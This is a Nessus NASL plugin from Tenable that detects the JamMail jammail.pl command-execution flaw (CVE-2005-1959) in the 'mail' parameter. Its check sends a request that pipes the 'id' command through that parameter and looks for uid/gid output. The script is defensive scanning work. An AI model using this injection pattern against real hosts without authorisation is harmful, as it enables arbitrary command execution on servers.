#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");


if(description)
{
 script_id(18477);
 script_version("$Revision: 1.13 $");

 script_cve_id("CVE-2005-1959");
 script_bugtraq_id(13937);
 script_osvdb_id(17339);

 script_name(english:"JamMail jammail.pl mail Parameter Arbitrary Command Execution");
 script_summary(english:"Determines the presence of Jammail.pl remote command execution");

 script_set_attribute(attribute:"synopsis", value:
"A web application running on the remote host has a command execution
vulnerability." );
 script_set_attribute(attribute:"description", value:
"The remote host is running JamMail, a webmail application written in
Perl.

The version of JamMail running on the remote host has an arbitrary
command execution vulnerability.  Input to the 'mail' parameter of
jammail.pl is not sanitized.  A remote attacker could exploit this
to execute arbitrary commands with the privileges of the web server." );
 script_set_attribute(
   attribute:"see_also",
   value:"http://www.securitytracker.com/alerts/2005/Jun/1014175.html"
 );
 script_set_attribute( attribute:"solution",  value:
"This application is no longer maintained.  Consider using a
different webmail product." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
 script_set_cvss_temporal_vector("CVSS2#E:H/RL:U/RC:ND");
 script_set_attribute(attribute:"exploitability_ease", value:"No exploit is required");
 script_set_attribute(attribute:"exploit_available", value:"true");
 script_set_attribute(attribute:"plugin_publication_date", value: "2005/06/13");
 script_set_attribute(attribute:"vuln_publication_date", value: "2005/06/12");
 script_cvs_date("$Date: 2011/03/15 19:22:15 $");
 script_set_attribute(attribute:"plugin_type", value:"remote");
 script_end_attributes();

 script_category(ACT_ATTACK);
 script_family(english:"CGI abuses");
 
 script_copyright(english:"This script is Copyright (C) 2005-2011 Tenable Network Security, Inc.");
 
 script_dependencies("http_version.nasl");
 script_exclude_keys("Settings/disable_cgi_scanning");
 script_require_ports("Services/www", 80);

 exit(0);
}

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


if ( thorough_tests )
 extra_list = make_list ("/mail", "/jammail", "/cgi-bin/jammail");
else
 extra_list = NULL;

http_check_remote_code (
			extra_dirs: extra_list,
			check_request:"/jammail.pl?job=showoldmail&mail=|id|",
			extra_check:"<td width=80% height=16>uid=[0-9].* gid=[0-9].*",
			check_result:"uid=[0-9]+.*gid=[0-9]+.*",
			command:"id"
			);
